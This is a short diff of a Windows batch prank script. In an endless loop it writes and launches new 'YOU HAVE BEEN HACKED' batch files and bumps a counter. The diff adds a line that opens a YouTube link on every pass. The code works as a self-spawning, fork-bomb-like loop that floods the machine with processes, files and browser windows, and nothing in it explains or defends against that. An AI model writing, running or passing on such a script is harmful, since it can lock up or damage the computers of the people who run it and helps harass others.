@@ -57,6 +57,7 @@ echo echo YOU HAVE BEEN HACKED!!! LOLOLOL>>hacked%number%.bat
 title yOU haVE BEEN HACKED!!!
 start "%~dp0\hacked%number%.bat"
 set /a number=%number% + 1
+start "" "https://www.youtube.com/watch?v=ZPN6fSNXHXw"
 goto loop
 
 
